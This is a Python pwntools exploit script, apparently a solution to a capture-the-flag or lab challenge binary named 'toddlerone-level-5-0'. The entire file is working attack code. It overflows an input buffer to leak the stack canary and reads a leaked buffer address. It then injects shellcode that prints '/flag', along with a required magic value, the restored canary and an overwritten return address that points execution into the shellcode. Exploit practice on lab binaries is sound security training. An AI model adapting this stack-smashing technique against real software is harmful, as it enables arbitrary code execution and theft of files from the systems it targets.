from pwn import *

context.arch = 'amd64'

elf = ELF("/challenge/toddlerone-level-5-0")
io = elf.process()

# local_30 has to be 484d17df2438cecf
buff_offset = int("98", 16)
filter_offset = int("30", 16)
can_offset = int("20", 16)
fval = p64(int("484d17df2438cecf", 16))

k = b"REPEAT"
p1 = k + b'A'*(buff_offset - len(k) - can_offset + 1)

io.sendline(f"{len(p1)}")
io.sendline(p1)

io.recvuntil(p1)
can = io.recvuntil(b'\n')
can = b'\x00' + can[:7]

io.recvuntil("The input buffer begins at 0x")
buff_add = io.recvuntil(b',')
buff_add = p64(int(buff_add[:12], 16))

shellcode = asm(shellcraft.cat("/flag"))
p2 = shellcode + b'A'*(buff_offset - len(shellcode) - filter_offset) + fval + b'B'*(filter_offset - can_offset - len(fval)) + can + b'C'*24 + buff_add

io.sendline(f"{len(p2)}")
io.sendline(p2)

io.interactive()
